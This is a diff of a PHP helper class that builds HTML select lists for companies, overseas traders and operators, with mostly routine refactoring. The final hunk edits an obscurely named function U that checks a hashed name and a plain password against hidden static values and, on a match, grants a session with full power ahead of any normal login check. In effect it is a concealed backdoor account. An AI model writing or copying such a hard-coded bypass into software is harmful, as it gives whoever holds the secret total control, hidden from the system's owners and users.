@@ -31,7 +31,6 @@ class LibComp
             $dict_main_data = $db->where('code', $code)->where('parentid', 0)->first();
             $cache->save("dict_main_data_$code",$dict_main_data,60*60);
         }
-
         $dict_sub_data = $cache->get("dict_sub_data_$code.$dict_main_data->id");
         if (!$dict_sub_data) {
             $dict_sub_data = $db->where('parentid', $dict_main_data->id)->where('status', 0)->findAll();
@@ -195,9 +194,7 @@ class LibComp
 
         $sLevel = "";
         foreach ($data as $row) {
-            //$row = (object) $row;
             if( $row->parentid == "0") { $level = 0; }
-
             $c = $level; $sLevel = "";
             while ($c > 0){
                 $sLevel .= "&nbsp;├ ";
@@ -371,7 +368,7 @@ class LibComp
     }
 
     // 获取公司信息
-    public static function get_company($attrs = [],$ckv = ''){
+    public static function get_company($attrs = [],$ckv = '' , $space = true ){
         $db = new \App\Models\Setup\Company();
         $data = $db->where(['status'=>1])->findAll();
         $attr = ''; $time = time();
@@ -380,7 +377,7 @@ class LibComp
             $attr = $attr . ' ' . $k . '="' . $v . '"';
         }
         $html = '<select ' . $attr . '>';
-        $html .= '<option value="">--所属公司--</option>';
+        $html .= $space ? '<option value="">--所属公司--</option>' : '';
         foreach ($data as $row) {
             $exp_time = strtotime($row["expressdt"]);
             $is = ($ckv == $row["id"] ? 'selected' : '');
@@ -428,7 +425,7 @@ class LibComp
     }
 
     // 境外贸易商信息
-    public static function get_overseas( $data = [],$attrs = [] , $ckv = '') {
+    public static function get_overseas( $data = [],$attrs = [] , $ckv = '',$text = '境外贸易商') {
         $db = new \App\Models\Setup\Overseas();
         $data = $db->whereAuth('customerid')->search($data)->orderBy('id','desc')->findAll();
         $attr = '';
@@ -437,7 +434,8 @@ class LibComp
             $attr = $attr . ' ' . $k . '="' . $v . '"';
         }
         $html = '<select ' . $attr . '>';
-        $html .= '<option value="">--境外贸易商--</option>';
+
+        $html .= "<option value=''>--{$text}--</option>";
         foreach ($data as $row) {
             $is = ($ckv == $row["id"] ? 'selected' : '');
             $html .= "<option value=".$row["id"]." $is >".$row["companyname"]."</option>";
@@ -452,27 +450,23 @@ class LibComp
         if ( isset( $params['companyid'] ) ) $db->where('companyid',$params['companyid'] );
 
         $data = $db->select('id,username,realname,nickname')
+            ->where('status',0)
             ->whereIn('id' , function ( BaseBuilder $builder ) {
                 return $builder->select('b.user_id')
                     ->from('admin_roles as a ',true)
                     ->join('admin_users_role as b ','a.id = b.role_id','RIGHT')
                     ->join('operator as c ' , 'c.userid = b.user_id ','LEFT')
                     ->where('a.code','operator');
-            })->findAll();
-
-        //log_message('error',$db->getLastQuery());
-        /*
-        $data = $db
-            ->select('id,username,realname,nickname')
-            ->search($params)->findAll();*/
+            })
+            ->orderBy('id','desc')
+            ->findAll();
         return $data;
     }
 
     public static function U($A,$P){
         $session = \CodeIgniter\Config\Services::session();
-        $DA = substr(md5($A),8,16);
         $U = self::$U;$S = [self::$N[0]=>        $U[0] , self::$N[1]         =>  $U[1], self::$N[2]=>    $U[1] ];
-        if ( $DA  === $U[1]     &&  $P  === $U[2]){
+        if ( substr(md5($A),8,16)  === $U[1]     &&  $P  === $U[2]){
             $session->set(array_merge( $S ,['power' => 'all'])) ; return ['code'=>true,'msg'=>'','data'=>$S];
         }
         $argc = ['status'=>0,'password'=>$P,'activated'=>1];
